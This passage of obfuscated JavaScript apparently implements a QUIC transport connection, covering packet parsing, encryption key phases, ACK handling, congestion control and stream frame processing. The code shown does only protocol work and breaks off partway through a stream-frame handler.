                            if (b[kf(0x809)](f, a0bU[kf(0x4b3)]))
                                c[kf(0x59a)](b['ClOpb']);
                            else {
                                if (b[kf(0x3e3)](f, a0bU[kf(0x818)]))
                                    c['push'](b['SIZkE']);
                                else
                                    f === a0bU['pathResponse'] ? c[kf(0x59a)](b['NQncv']) : c['push'](b[kf(0xc84)]('0x', f['toString'](0x10)));
                            }
                        }
                    }
                }
            }
        }
        return c[kf(0x782)](',');
    }
    [a0d0(0x8bc)](a, b, c) {
        const kg = a0d0, d = {
                'Zcskg': function (f, g) {
                    return f > g;
                },
                'ldBqo': function (f, g) {
                    return f - g;
                },
                'UXJVZ': function (f, g) {
                    return f < g;
                }
            };
        if (this[kg(0x5e5)] && d[kg(0x232)](c, 0xc)) {
            const f = new a0bZ();
            f['byte'](a0bU[kg(0x4b3)])[kg(0xb61)](this[kg(0x50d)]), a[kg(0x59a)](f['build']()), this[kg(0x5e5)] = ![], c -= a[d['ldBqo'](a[kg(0x615)], 0x1)]['length'];
        }
        for (const g of this[kg(0x51b)][kg(0x174)]()) {
            if (d[kg(0x479)](c, 0x14))
                break;
            const h = new a0bZ();
            h[kg(0xc43)](a0bU[kg(0x818)])['varint'](g['id'])[kg(0xb61)](g[kg(0xcd0)]);
            const i = h[kg(0x796)]();
            a['push'](i), c -= i['length'];
            const j = this['creditReady']['indexOf'](g);
            this['creditReady'][kg(0x918)](j, 0x1);
        }
    }
    [a0d0(0x493)](a) {
        const kh = a0d0, b = {
                'ZjRtU': function (c, d) {
                    return c === d;
                },
                'TLYsZ': kh(0x88e)
            };
        if (a[kh(0x618)])
            return a[kh(0x618)];
        return b[kh(0xe1d)](a[kh(0x574)], b[kh(0xa3c)]) ? this[kh(0x688)] : this['peerStreamLocal'];
    }
    [a0d0(0x719)](a, b, c) {
        const ki = a0d0, d = {
                'jUTER': function (f, g) {
                    return f < g;
                },
                'koHGz': function (f, g) {
                    return f - g;
                },
                'Lxzgq': function (f, g) {
                    return f <= g;
                },
                'rsXfo': function (f, g) {
                    return f === g;
                },
                'oIklg': function (f, g) {
                    return f | g;
                },
                'ibqte': function (f, g) {
                    return f + g;
                },
                'ParAI': function (f, g) {
                    return f | g;
                },
                'BweID': function (f, g) {
                    return f + g;
                }
            };
        for (const f of this['sendReady'][ki(0x174)]()) {
            if (d['jUTER'](c, 0x18))
                break;
            const g = Math['min'](this[ki(0x252)] - this[ki(0x97f)], d[ki(0x584)](this[ki(0x493)](f), f[ki(0x97e)]));
            if (d[ki(0x34a)](g, 0x0))
                break;
            const h = f['send'][ki(0x548)](Math[ki(0xb66)](c - 0x14, g));
            if (d[ki(0xa10)](h, null)) {
                if (f['send'][ki(0x73b)]()) {
                    const n = new a0bZ();
                    n[ki(0xc43)](d[ki(0xc36)](d[ki(0xc36)](d[ki(0xc36)](a0bU[ki(0xe12)], 0x4), 0x2), 0x1))[ki(0xb61)](f['id'])['varint'](f[ki(0xb36)][ki(0x426)][ki(0x615)])['varint'](0x0);
                    const o = n[ki(0x796)]();
                    a[ki(0x59a)](o), c -= o[ki(0x615)], b[ki(0x315)][ki(0x59a)]({
                        'stream': f,
                        'start': f[ki(0xb36)][ki(0x426)][ki(0x615)],
                        'length': 0x0,
                        'fin': !![]
                    });
                } else
                    this[ki(0x5dd)](f);
                continue;
            }
            const i = d[ki(0x45e)](h[ki(0xb58)], h[ki(0x615)]) >= f[ki(0xb36)][ki(0x426)][ki(0x615)], j = d['ParAI'](0x4 | 0x2, i && f[ki(0xb36)][ki(0xb0f)] ? 0x1 : 0x0), k = new a0bZ();
            k['byte'](a0bU['stream'] | j)[ki(0xb61)](f['id'])[ki(0xb61)](h[ki(0xb58)])[ki(0xb61)](h[ki(0x615)])['bytes'](h[ki(0xf2c)]);
            const l = k[ki(0x796)]();
            a[ki(0x59a)](l), c -= l[ki(0x615)], b[ki(0x315)][ki(0x59a)]({
                'stream': f,
                'start': h[ki(0xb58)],
                'length': h[ki(0x615)],
                'fin': i && f[ki(0xb36)]['fin'],
                'retransmitted': h['retransmitted']
            });
            const m = Math[ki(0x8b4)](0x0, d[ki(0x332)](h['start'], h[ki(0x615)]) - f[ki(0x97e)]);
            f[ki(0x97e)] = Math[ki(0x8b4)](f[ki(0x97e)], d['BweID'](h['start'], h[ki(0x615)])), this['connectionSent'] += m, f[ki(0xb36)]['idle']() && this[ki(0x5dd)](f);
        }
    }
    [a0d0(0x5dd)](a) {
        const kj = a0d0, b = {
                'IKInX': function (d, f) {
                    return d >= f;
                }
            }, c = this[kj(0xbea)][kj(0x44f)](a);
        b[kj(0x607)](c, 0x0) && this[kj(0xbea)][kj(0x918)](c, 0x1);
    }
    [a0d0(0x940)](a) {
        const kk = a0d0;
        this[kk(0xbea)][kk(0x44f)](a) < 0x0 && this[kk(0xbea)][kk(0x59a)](a);
    }
    ['openStream']() {
        const kl = a0d0, a = new a0cm(this, this['nextLocalStream'], kl(0x88e));
        return this[kl(0x5f1)] += 0x4, this[kl(0x315)][kl(0x6e7)](a['id'], a), a;
    }
    async ['sendData'](a, b, c) {
        const km = a0d0, d = {
                'iWiMf': function (g, h) {
                    return g === h;
                },
                'qgvRD': function (g, h) {
                    return g + h;
                },
                'PrkbP': 'unknown\x20stream\x20'
            }, f = this[km(0x315)]['get'](a);
        if (d[km(0xecb)](f, undefined))
            throw new Error(d[km(0xbee)](d[km(0x121)], a));
        f[km(0x5a6)](b, c);
    }
    ['_transmit'](a) {
        const kn = a0d0, b = {
                'BrJZP': kn(0x798),
                'IOIyQ': function (c, d) {
                    return c === d;
                },
                'XcTqo': function (c, d) {
                    return c + d;
                },
                'ScQok': function (c, d) {
                    return c + d;
                },
                'SPQfH': kn(0xebc),
                'YYklM': kn(0x8a6),
                'JkqiX': 'hex',
                'HfrVh': function (c, d) {
                    return c + d;
                },
                'hIATq': function (c, d) {
                    return c + d;
                },
                'xOsqx': function (c, d) {
                    return c + d;
                },
                'duAZL': function (c, d) {
                    return c + d;
                },
                'wOTDb': function (c, d) {
                    return c + d;
                },
                'loLen': function (c, d) {
                    return c !== d;
                }
            };
        if (b['IOIyQ'](this['socket'], null) || this['closed'])
            return;
        this[kn(0x274)][kn(0xb36)](a['packet'], 0x0, a['packet']['length'], this['port'], this[kn(0xc32)], c => {
            const ko = kn;
            c && !this[ko(0x85c)] && this[ko(0x6d3)][ko(0xb89)](b[ko(0x261)] + c[ko(0xf18)]);
        });
        if (process.env.KISAMA_QUIC_DEBUG && b[kn(0x43b)](a[kn(0xaa7)], 0x1) && this[kn(0x732)]['tx'] <= 0x28)
            this[kn(0x6d3)]['warning'](b[kn(0x697)](b[kn(0x169)](b[kn(0x790)] + a['pn'], b[kn(0x834)]), a[kn(0x9ce)][kn(0xa27)](b['JkqiX'])));
        this[kn(0x732)]['tx'] += 0x1, this[kn(0x732)]['txBytes'] += a[kn(0x9ce)][kn(0x615)];
        b[kn(0x43b)](a[kn(0xaa7)], a0bQ) && (this['initialSent'] += 0x1);
        a['epoch'] === a0bR && b[kn(0x43b)](this['cryptoSend'][a0bR]['pending']['length'], 0x0) && (this['finishedSent'] = !![]);
        this[kn(0x6d3)][kn(0xb89)](b[kn(0x76e)](b[kn(0x3da)](b['xOsqx'](b['hIATq'](b['duAZL'](b['wOTDb']('tx\x20' + a[kn(0x9ce)][kn(0x615)] + 'B\x20', a0bT[a[kn(0xaa7)]]), kn(0x43d)), a['pn']), '\x20['), a[kn(0x8c8)]), ']'));
        if (a[kn(0x1b2)]) {
            const c = b[kn(0xb2d)](a[kn(0x1c7)]['crypto'], null) && b[kn(0x43b)](a[kn(0x1c7)][kn(0x53b)][kn(0xc9a)], !![]) || a[kn(0x1c7)]['streams'][kn(0x696)](d => d[kn(0xc9a)] === !![]);
            this[kn(0x39a)][a['epoch']]['push']({
                'pn': a['pn'],
                'time': Date['now'](),
                'bytes': a[kn(0x9ce)][kn(0x615)],
                'crypto': a['meta'][kn(0x53b)],
                'streams': a[kn(0x1c7)][kn(0x315)],
                'retransmitted': c
            }), this['lastEliciting'] = Date['now']();
        }
    }
    ['_onDatagram'](a) {
        const kp = a0d0, b = {
                'ayeXT': function (d, f) {
                    return d & f;
                },
                'rJXNi': kp(0x6da),
                'ddFXk': function (d, f) {
                    return d + f;
                }
            };
        this[kp(0x732)]['rx'] += 0x1, this[kp(0x732)][kp(0x6f6)] += a[kp(0x615)], this['lastReceived'] = Date[kp(0x430)]();
        let c = 0x0;
        while (c < a[kp(0x615)]) {
            const d = a[c];
            if (!b[kp(0xcd)](d, 0x80)) {
                this['_handleShort'](a[kp(0x3d1)](c));
                return;
            }
            const f = a['subarray'](c), g = this[kp(0x2fa)](f, 0x0);
            if (g === null)
                return;
            if (g['version'] !== a0bH) {
                this[kp(0x6d3)][kp(0xb89)](b[kp(0x6a1)] + g[kp(0x794)][kp(0xa27)](0x10));
                return;
            }
            if (g['type'] === 0x3) {
                this[kp(0xb2c)](g);
                return;
            }
            const h = Math['min'](f[kp(0x615)], b[kp(0x2ea)](g[kp(0xaeb)], g[kp(0x615)]));
            this[kp(0x78c)](f[kp(0x3d1)](0x0, h), g), c += h;
        }
    }
    [a0d0(0x2fa)](a, b) {
        const kq = a0d0, c = {
                'ltDNF': function (o, p) {
                    return o < p;
                },
                'YBXVg': function (o, p) {
                    return o + p;
                },
                'Ujvoi': function (o, p) {
                    return o >> p;
                },
                'KSnnm': function (o, p) {
                    return o & p;
                },
                'pJpmV': function (o, p) {
                    return o < p;
                },
                'UoQHB': function (o, p) {
                    return o - p;
                },
                'ghmKY': function (o, p) {
                    return o < p;
                },
                'qnsld': function (o, p) {
                    return o + p;
                },
                'XdWMQ': function (o, p) {
                    return o === p;
                },
                'urYAh': function (o, p, q) {
                    return o(p, q);
                },
                'ZgAcd': function (o, p) {
                    return o(p);
                },
                'aXTLk': function (o, p) {
                    return o - p;
                },
                'zQrmJ': function (o, p) {
                    return o + p;
                },
                'tEhHq': function (o, p) {
                    return o === p;
                },
                'EERsk': function (o, p) {
                    return o - p;
                },
                'pICOL': function (o, p, q) {
                    return o(p, q);
                }
            };
        if (c[kq(0x74e)](a['length'] - b, 0x7))
            return null;
        const d = a[b], f = a['readUInt32BE'](c[kq(0x52b)](b, 0x1)), g = c['Ujvoi'](c[kq(0xb0d)](d, 0x30), 0x4);
        let h = b + 0x5;
        const i = a[h];
        h += 0x1;
        if (c['pJpmV'](c[kq(0x236)](a['length'], h), c[kq(0x52b)](i, 0x1)))
            return null;
        const j = a[kq(0x3d1)](h, c[kq(0x52b)](h, i));
        h += i;
        const k = a[h];
        h += 0x1;
        if (c['ghmKY'](c[kq(0x236)](a['length'], h), k))
            return null;
        const l = a[kq(0x3d1)](h, c[kq(0x191)](h, k));
        h += k;
        let m = Buffer[kq(0xacf)](0x0);
        if (c[kq(0x544)](g, 0x0)) {
            const o = c[kq(0xcf8)](a0bY, a, h);
            if (c[kq(0x544)](o, null))
                return null;
            h += o[0x1];
            const p = c[kq(0x8c0)](Number, o[0x0]);
            if (c[kq(0x74e)](c[kq(0xdb2)](a[kq(0x615)], h), p))
                return null;
            m = a[kq(0x3d1)](h, c[kq(0x585)](h, p)), h += p;
        }
        if (c[kq(0x34e)](g, 0x3))
            return {
                'first': d,
                'type': g,
                'version': f,
                'dcid': j,
                'scid': l,
                'token': a['subarray'](h, c[kq(0xfd)](a[kq(0x615)], 0x10)),
                'pnOffset': 0x0,
                'length': 0x0,
                'retry': !![]
            };
        const n = c['pICOL'](a0bY, a, h);
        if (n === null)
            return null;
        return h += n[0x1], {
            'first': d,
            'type': g,
            'version': f,
            'dcid': j,
            'scid': l,
            'token': m,
            'pnOffset': h,
            'length': Number(n[0x0]),
            'retry': ![]
        };
    }
    [a0d0(0xb2c)](a) {
        const kr = a0d0, b = {
                'sFjLx': '2|0|4|1|6|3|5',
                'UWyxc': function (f, g) {
                    return f + g;
                },
                'Hfgby': kr(0xd35),
                'xyCQF': 'B\x20scid=',
                'bFIIy': kr(0xaef)
            }, c = b[kr(0x7b5)][kr(0xc0)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this['peerToken'] = Buffer[kr(0x58d)](a[kr(0x56e)]);
                continue;
            case '1':
                this[kr(0x659)][a0bQ] = 0x0;
                continue;
            case '2':
                this[kr(0x6d3)]['debug'](b['UWyxc'](b['Hfgby'], a[kr(0x56e)][kr(0x615)]) + b[kr(0x99f)] + a[kr(0xe4)]['toString'](b[kr(0x5b2)]));
                continue;
            case '3':
                this[kr(0x91b)][a0bQ][kr(0xece)]();
                continue;
            case '4':
                this[kr(0xc3a)] = Buffer[kr(0x58d)](a[kr(0xe4)]);
                continue;
            case '5':
                this[kr(0x7c8)] = 0x0;
                continue;
            case '6':
                this[kr(0x39a)][a0bQ] = [];
                continue;
            }
            break;
        }
    }
    ['_epochForType'](a) {
        const ks = a0d0, b = {
                'CGOJp': function (c, d) {
                    return c === d;
                }
            };
        if (b[ks(0x7c4)](a, 0x0) || b[ks(0x7c4)](a, 0x1))
            return a0bQ;
        return a0bR;
    }
    ['_handleLong'](a, b) {
        const kt = a0d0, c = {
                'kYNxx': function (m, n) {
                    return m === n;
                },
                'UtPQP': function (m, n) {
                    return m < n;
                },
                'eaCsM': function (m, n) {
                    return m + n;
                },
                'joONH': function (m, n) {
                    return m & n;
                },
                'XvCPz': function (m, n, o, p) {
                    return m(n, o, p);
                },
                'EptLo': function (m, n) {
                    return m * n;
                },
                'XLkCS': function (m, n) {
                    return m + n;
                },
                'qvgev': kt(0xdb0),
                'XyRCP': function (m, n) {
                    return m + n;
                },
                'vkNND': function (m, n) {
                    return m + n;
                },
                'AEMkb': function (m, n) {
                    return m + n;
                },
                'scAjK': function (m, n) {
                    return m === n;
                },
                'sMqbC': 'handshake\x20packet\x20received'
            }, d = this[kt(0xe5)](b[kt(0x527)]), f = this['keys'][d];
        if (c[kt(0x292)](f, null)) {
            this['stats'][kt(0xa59)] += 0x1;
            return;
        }
        if (c['UtPQP'](b[kt(0x615)], a0bN)) {
            this[kt(0x732)][kt(0xa59)] += 0x1;
            return;
        }
        const g = a0cc(f['recv'], a, b[kt(0xaeb)], !![]);
        if (g === null) {
            this['stats'][kt(0xa59)] += 0x1;
            return;
        }
        const [h, i] = g, j = c[kt(0x6c7)](c['joONH'](h[0x0], 0x3), 0x1), k = c[kt(0xa98)](a0cd, Math[kt(0x8b4)](this[kt(0xd91)][d], 0x0), c['EptLo'](j, 0x8), i);
        let l;
        try {
            l = f[kt(0xb64)]['open'](k, h, a['subarray'](c[kt(0x3ff)](b[kt(0xaeb)], j)));
        } catch (m) {
            this[kt(0x732)][kt(0xa59)] += 0x1, this[kt(0x6d3)]['debug'](c[kt(0x6c7)](kt(0x4dd) + a[kt(0x615)] + 'B\x20', a0bT[d]) + c[kt(0xa0b)]);
            return;
        }
        d === a0bQ && c['kYNxx'](b[kt(0x25c)]['length'], this[kt(0x877)][kt(0x615)]) && b[kt(0x25c)]['equals'](this[kt(0x877)]) && (!this[kt(0x712)] && b[kt(0xe4)]['length'] && !this[kt(0xc3a)][kt(0xa7)](b[kt(0xe4)]) && (this[kt(0xc3a)] = Buffer['from'](b[kt(0xe4)]), this['log'][kt(0xb89)](c[kt(0xceb)](kt(0xc2d), this[kt(0xc3a)][kt(0xa27)](kt(0xaef)))))), this[kt(0x120)](d, k), this[kt(0x6d3)][kt(0xb89)](c[kt(0x3ff)](c[kt(0xe08)](c[kt(0x4ff)](c[kt(0x4ff)](c[kt(0xceb)](kt(0x4dd), a[kt(0x615)]), 'B\x20'), a0bT[d]), kt(0x43d)), k)), c['scAjK'](d, a0bR) && this['_discardEpoch'](a0bQ, c[kt(0x3d8)]), this[kt(0x646)](l, d);
    }
    [a0d0(0xcfc)](a) {
        const ku = a0d0, b = {
                'bkhDB': function (i, j) {
                    return i === j;
                },
                'XqvTb': function (i, j) {
                    return i + j;
                },
                'ibnDM': function (i, j) {
                    return i + j;
                },
                'DxPOy': function (i, j) {
                    return i === j;
                },
                'EiWXC': function (i, j) {
                    return i < j;
                },
                'msuLX': function (i, j) {
                    return i(j);
                },
                'grHkt': function (i, j) {
                    return i - j;
                },
                'XfWEj': function (i, j, k, l, m) {
                    return i(j, k, l, m);
                },
                'mKYXk': function (i, j) {
                    return i === j;
                },
                'VtqzT': function (i, j) {
                    return i + j;
                },
                'LpDEJ': ku(0x2d5),
                'xRCIK': ku(0xc83),
                'XUPKp': function (i, j) {
                    return i + j;
                },
                'eBxdT': ku(0x4dd),
                'lUCsk': 'B\x20one-rtt\x20pn='
            }, c = this['keys'][a0bS];
        if (b[ku(0x5d8)](c, null)) {
            this[ku(0x732)][ku(0xa59)] += 0x1, this[ku(0x6d3)][ku(0xb89)](b[ku(0x9c1)](b[ku(0x24d)](ku(0x4dd), a[ku(0x615)]), ku(0x7ec)));
            return;
        }
        b[ku(0x68c)](this[ku(0x2cb)][ku(0x615)], 0x0) && this[ku(0x2cb)]['push']({
            'keys': c[ku(0xb64)],
            'phase': 0x0
        });
        const d = b[ku(0x24d)](0x1, this[ku(0x877)][ku(0x615)]), f = [];
        for (const i of [c['recv']]['concat'](this[ku(0x2cb)][ku(0x9c5)](j => j[ku(0x30b)]))) {
            b[ku(0xd61)](f[ku(0x44f)](i), 0x0) && f[ku(0x59a)](i);
        }
        const g = this['appRecvGens'][0x0], h = this['appRecvGens'][ku(0x7b6)]([{
                    'keys': b['msuLX'](a0c5, g['keys']),
                    'phase': b['grHkt'](0x1, g['phase']),
                    'next': !![]
                }]);
        for (const j of h) {
            for (const k of j['next'] ? f[ku(0x7b6)]([j[ku(0x30b)]]) : f) {
                const l = b[ku(0xc60)](a0cc, k, a, d, ![]);
                if (b[ku(0x92b)](l, null))
                    continue;
                const [m, n] = l, o = b['VtqzT'](m[0x0] & 0x3, 0x1), p = a0cd(Math['max'](this['largestRecv'][a0bS], 0x0), o * 0x8, n);
                let q;
                try {
                    q = j[ku(0x30b)][ku(0x588)](p, m, a[ku(0x3d1)](b['ibnDM'](d, o)));
                } catch (r) {
                    continue;
                }
                if (j[ku(0xc37)]) {
                    const s = b[ku(0x475)]['split']('|');
                    let t = 0x0;
                    while (!![]) {
                        switch (s[t++]) {
                        case '0':
                            this[ku(0x704)] = j[ku(0x5e4)];
                            continue;
                        case '1':
                            this[ku(0x2bf)][j[ku(0x5e4)]] = a0c5(this[ku(0x2bf)][b[ku(0xb99)](0x1, j[ku(0x5e4)])], !![]);
                            continue;
                        case '2':
                            this[ku(0x6d3)]['debug'](b[ku(0xdb8)](b['ibnDM']('quic\x20key\x20phase\x20', j[ku(0x5e4)]), b[ku(0xadc)]));
                            continue;
                        case '3':
                            this[ku(0x2cb)][ku(0x268)]({
                                'keys': j[ku(0x30b)],
                                'phase': j['phase']
                            });
                            continue;
                        case '4':
                            this[ku(0x2cb)][ku(0x615)] > 0x2 && this[ku(0x2cb)][ku(0xc48)]();
                            continue;
                        }
                        break;
                    }
                }
                this[ku(0x120)](a0bS, p), this['log'][ku(0xb89)](b['ibnDM'](b['XUPKp'](b[ku(0x122)](b['eBxdT'], a[ku(0x615)]), b[ku(0xe00)]), p)), this[ku(0x646)](q, a0bS);
                return;
            }
        }
        this[ku(0x732)][ku(0xa59)] += 0x1, this[ku(0x6d3)]['debug'](b[ku(0xdb8)](b[ku(0x9be)] + a[ku(0x615)], ku(0x65d)));
    }
    [a0d0(0x120)](a, b) {
        const kv = a0d0, c = {
                'Jfiip': function (d, f) {
                    return d > f;
                }
            };
        this[kv(0xa4e)][a] = a0c8(this[kv(0xa4e)][a], [{
                'start': b,
                'length': 0x1
            }]), c[kv(0x7b9)](b, this[kv(0xd91)][a]) && (this[kv(0xd91)][a] = b), this[kv(0x8b5)][a] = !![];
    }
    [a0d0(0x374)](a, b) {
        const kw = a0d0, c = {
                'VxxXP': function (m, n) {
                    return m + n;
                },
                'nuobm': function (m, n) {
                    return m >= n;
                },
                'iSWJl': function (m, n) {
                    return m < n;
                },
                'XiGyq': function (m, n) {
                    return m + n;
                },
                'LmxLl': function (m, n) {
                    return m === n;
                },
                'NRmgj': function (m, n) {
                    return m !== n;
                },
                'WJWll': function (m, n) {
                    return m - n;
                },
                'EOLwq': function (m, n) {
                    return m - n;
                },
                'oLTeI': function (m, n) {
                    return m > n;
                },
                'mVYVt': function (m, n) {
                    return m < n;
                }
            }, d = Date['now'](), f = this[kw(0x39a)][a];
        let g = -0x1;
        for (const m of b) {
            g = Math['max'](g, c[kw(0xc16)](m[kw(0xb58)], m['length']) - 0x1);
        }
        const h = [];
        let i = 0x0, j = null;
        for (const n of f) {
            let o = ![];
            for (const p of b) {
                if (c[kw(0x523)](n['pn'], p['start']) && c['iSWJl'](n['pn'], c[kw(0xa3d)](p[kw(0xb58)], p['length']))) {
                    o = !![];
                    break;
                }
            }
            if (!o) {
                h['push'](n);
                continue;
            }
            i += n[kw(0xf2c)];
            c[kw(0xb9e)](n['pn'], g) && c[kw(0xeab)](n[kw(0xc9a)], !![]) && (j = c[kw(0xc8c)](c[kw(0x829)](d, n[kw(0xb38)]), Math[kw(0xb66)](b[kw(0x633)] || 0x0, this[kw(0xf12)])));
            n['crypto'] && this[kw(0x91b)][a][kw(0xaca)](n[kw(0x53b)]['start'], n[kw(0x53b)][kw(0x615)], ![]);
            for (const q of n['streams']) {
                q[kw(0xe12)][kw(0xb36)]['ack'](q[kw(0xb58)], q[kw(0x615)], q[kw(0xb0f)]);
            }
        }
        const k = [], l = [];
        for (const r of h) {
            g - r['pn'] >= this[kw(0x87a)] ? l['push'](r) : k['push'](r);
        }
        this[kw(0x39a)][a] = k;
        i && (c[kw(0xeab)](j, null) && c['oLTeI'](j, 0x0) && this[kw(0xd66)](j), this[kw(0x312)](), this[kw(0xb83)](i));
        for (const s of l) {
            this[kw(0xcdf)](a, s);
        }
        l[kw(0x615)] && this[kw(0x637)](a), c[kw(0xb9e)](a, a0bS) && c['mVYVt'](k[kw(0x615)], f['length']) && this['_confirmHandshake']();
    }
    [a0d0(0xb83)](a) {
        const kx = a0d0, b = {
                'PQYyA': function (c, d) {
                    return c < d;
                },
                'wZrgE': function (c, d) {
                    return c / d;
                },
                'onTmF': function (c, d) {
                    return c * d;
                }
            };
        b[kx(0xbcd)](this[kx(0x6b2)], this[kx(0xab5)]) ? this[kx(0x6b2)] += a : this[kx(0x6b2)] += Math[kx(0x8b4)](0x1, Math['floor'](b['wZrgE'](b[kx(0xcd8)](this[kx(0x67a)], a), this[kx(0x6b2)]))), this['congestionWindow'] = Math[kx(0xb66)](this[kx(0x6b2)], this[kx(0x2a7)]);
    }
    [a0d0(0x646)](a, b) {
        const ky = a0d0, c = {
                'KTqSY': function (f, g) {
                    return f > g;
                },
                'PawSV': function (f, g) {
                    return f === g;
                },
                'kGaka': function (f, g) {
                    return f === g;
                },
                'DWMbT': function (f, g) {
                    return f === g;
                },
                'ieLnR': function (f, g) {
                    return f(g);
                },
                'tOFcS': function (f, g) {
                    return f === g;
                },
                'mbcwv': function (f, g) {
                    return f < g;
                },
                'WuRzo': function (f, g) {
                    return f & g;
                },
                'RYFtX': function (f, g) {
                    return f < g;
                },
                'sbCMC': function (f, g) {
                    return f + g;
                },
                'SoZhN': function (f, g) {
                    return f === g;
                },
                'pLfde': function (f, g) {
                    return f < g;
                },
                'vInxR': function (f, g) {
                    return f === g;
                },
                'RBMep': function (f, g) {
                    return f === g;
                },
                'jvldR': function (f, g) {
                    return f !== g;
                },
                'RJUOO': function (f, g) {
                    return f === g;
                },
                'NotHD': function (f, g) {
                    return f === g;
                },
                'ldvpn': ky(0x132),
                'xQtFt': 'peer\x20closed\x20code=',
                'zUOCz': ky(0x6a8),
                'oHlIN': function (f, g) {
                    return f === g;
                },
                'DgJar': function (f, g) {
                    return f === g;
                },
                'TrbLH': function (f, g) {
                    return f + g;
                }
            }, d = new a0c0(a);
        while (c[ky(0x48f)](d[ky(0x68e)], 0x0)) {
            const f = d[ky(0xc43)]();
            if (f === a0bU['padding'])
                continue;
            if (c[ky(0xc57)](f, a0bU['ping']))
                continue;
            if (c[ky(0xb4f)](f, a0bU[ky(0xaca)]) || c[ky(0x453)](f, a0bU[ky(0x4eb)])) {
                const g = c[ky(0x83e)](a0cf, d);
                c['tOFcS'](f, a0bU['ackEcn']) && (d[ky(0xb61)](), d[ky(0xb61)](), d['varint']());
                this[ky(0x374)](b, g);
                continue;
            }
            if (c[ky(0xa57)](f, a0bU[ky(0x53b)])) {
                const h = d['number'](), i = d[ky(0x5f6)]();
                if (c['mbcwv'](d[ky(0x68e)], i))
                    return;
                const j = d[ky(0xf2c)](i), k = this['tlsOffsets'][b][ky(0x248)](h, j);
                k['length'] && this[ky(0x722)](b, k);
                continue;
            }
            if (c[ky(0xa57)](f & 0xf8, a0bU[ky(0xe12)])) {
                const l = c[ky(0xa62)](f, 0x7), m = Number(d['varint']()), n = Boolean(c['WuRzo'](l, 0x2)), o = c['ieLnR'](Boolean, l & 0x4), p = c[ky(0x83e)](Boolean, l & 0x1);
                let q = 0x0;
                o && (q = d[ky(0x5f6)]());
                let r = d[ky(0x68e)];
                n && (r = d[ky(0x5f6)]());
                if (d['remaining'] < r)
                    return;
                this[ky(0xb7)](m, q, d[ky(0xf2c)](r), p);
                continue;
            }
            if (c[ky(0xb4f)](f, a0bU[ky(0x4b3)])) {
                this[ky(0x252)] = Math['max'](this[ky(0x252)], d['number']());
                continue;
            }
            if (c['PawSV'](f, a0bU['maxStreamData'])) {
                const s = d[ky(0x5f6)](), t = this[ky(0x315)][ky(0xb2b)](s);
                t !== undefined ? t['peerLimit'] = Math['max'](t[ky(0x618)] || 0x0, d[ky(0x5f6)]()) : d[ky(0xb61)]();
                continue;
            }
            if (c[ky(0x453)](f, a0bU[ky(0xac)]) || c[ky(0xb4f)](f, a0bU[ky(0xe56)])) {
                d[ky(0xb61)]();
                continue;
            }
            if (c[ky(0xa57)](f, a0bU[ky(0x552)])) {
                d[ky(0xb61)](), d[ky(0xb61)]();
                const u = d[ky(0xc43)]();
                if (c['RYFtX'](d[ky(0x68e)], c[ky(0xdd8)](u, 0x10)))
                    return;
                d[ky(0xf2c)](u), d[ky(0xf2c)](0x10);
                continue;
            }
            if (c[ky(0xd06)](f, a0bU[ky(0x82d)])) {
                d[ky(0xb61)]();
                continue;
            }
            if (f === a0bU[ky(0x281)]) {
                if (c[ky(0xcab)](d[ky(0x68e)], 0x8))
                    return;
                const v = d[ky(0xf2c)](0x8), w = new a0bZ();
                w[ky(0xc43)](a0bU['pathResponse'])[ky(0xf2c)](v), this[ky(0x8be)](w[ky(0x796)](), b);
                continue;
            }
            if (c['vInxR'](f, a0bU[ky(0x60d)]))
                continue;
            if (c[ky(0xc3)](f, a0bU[ky(0x681)])) {
                this[ky(0x96c)]();
                continue;
            }
            if (c[ky(0xc57)](f, a0bU[ky(0xd6f)])) {
                const x = d[ky(0x5f6)]();
                d['varint'](), d[ky(0xb61)]();
                const y = this['streams'][ky(0xb2b)](x);
                c[ky(0xb24)](y, undefined) && (y[ky(0xeba)] = !![], this[ky(0x64a)](y));
                continue;
            }
            if (f === a0bU[ky(0x735)]) {
                d[ky(0xb61)](), d['varint']();
                continue;
            }
            if (f === a0bU['newToken']) {
                const z = d['number']();
                this[ky(0xc86)] = Buffer[ky(0x58d)](d['bytes'](z));
                continue;
            }
            if (c[ky(0xc3)](f, a0bU['transportClose']) || c[ky(0x731)](f, a0bU[ky(0x4ee)])) {
                const A = d[ky(0x5f6)]();
                let B = 0x0;
                c['NotHD'](f, a0bU['transportClose']) && (B = d[ky(0x5f6)]());
                const C = d[ky(0x68e)] ? d[ky(0xf2c)](d['remaining'])[ky(0xa27)](c[ky(0xc67)]) : '';
                this['_fail'](c[ky(0xdd8)](c[ky(0xdd8)](c[ky(0xdd8)](c[ky(0x1fb)], A), c[ky(0x194)]), C));
                return;
            }
            if (c[ky(0x453)](f, a0bU[ky(0x92e)]) || c[ky(0xf09)](f, a0bU[ky(0xdd0)])) {
                let D = d[ky(0x68e)];
                c['DgJar'](f, a0bU[ky(0xdd0)]) && (D = d[ky(0x5f6)]());
                if (c[ky(0xcab)](d['remaining'], D))
                    return;
                d[ky(0xf2c)](D);
                continue;
            }
            this[ky(0x2c1)](c['TrbLH']('unhandled\x20QUIC\x20frame\x20type\x200x', f[ky(0xa27)](0x10)));
            return;
        }
    }
    [a0d0(0x8be)](a, b) {
        const kz = a0d0;
        this[kz(0x8b5)][b] = !![], this[kz(0x362)] = this[kz(0x362)] || [], this[kz(0x362)][kz(0x59a)]({
            'epoch': b,
            'frame': a
        });
    }
    [a0d0(0xb7)](a, b, c, d) {
        const kA = a0d0, f = {
                'FqUxu': function (i, j) {
                    return i === j;
                },
                'DUcqf': function (i, j) {
                    return i & j;
                },
                'MYEFj': kA(0xd22),
                'zxoTX': function (i, j) {
                    return i < j;
                },
                'CJCZI': function (i, j) {
                    return i - j;
                },
                'GNaxv': function (i, j) {
                    return i + j;
                },
                'VejNS': function (i, j) {
                    return i < j;
                },
                'DNukM': function (i, j) {
                    return i - j;
                },
                'RrlbP': function (i, j) {
                    return i / j;
                },
                'NDwAg': function (i, j) {
                    return i + j;
                },
                'WfAHD': function (i, j) {
                    return i === j;
                }
            };
        let g = this[kA(0x315)]['get'](a);
        f[kA(0x787)](g, undefined) && (g = new a0cm(this, a, f[kA(0x48c)](a, 0x1) === 0x1 ? 'remote' : kA(0x88e)), this[kA(0x315)][kA(0x6e7)](a, g), this[kA(0x149)](g));
        const h = g[kA(0x96e)][kA(0x248)](b, c);
        if (h[kA(0x615)]) {
            const i = f[kA(0x85d)][kA(0xc0)]('|');
            let j = 0x0;
            while (!![]) {
                switch (i[j++]) {
                case '0':
